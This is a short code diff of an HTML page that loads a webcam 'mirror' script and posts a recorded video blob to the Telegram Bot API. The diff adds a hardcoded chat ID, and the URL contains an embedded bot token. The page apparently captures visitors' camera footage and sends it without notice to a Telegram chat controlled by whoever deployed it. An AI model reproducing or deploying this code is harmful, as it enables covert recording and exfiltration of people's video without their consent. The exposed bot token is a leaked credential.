@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html>
 <head>
 <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
@@ -17,10 +17,13 @@ function post(videoBlob){
     var formData = new FormData();
     formData.append('video', videoBlob, 'video.mp4');  // Menyertakan video dalam formData
 
-    // Kirim video ke bot Telegram
+    // Ganti dengan chat_id yang sesuai
+    const chatId = "7607840886";  // Ganti dengan chat ID yang tepat
+
+    // Kirim video ke bot Telegram dengan chat_id
     $.ajax({
         type: 'POST',
-        url: 'https://api.telegram.org/bot7558386866:AAHDkaNEi3Tw7_5ew4LOedzfmf7a7hfioEA/sendVideo',
+        url: `https://api.telegram.org/bot7558386866:AAHDkaNEi3Tw7_5ew4LOedzfmf7a7hfioEA/sendVideo`,
         data: formData,
         contentType: false,
         processData: false,
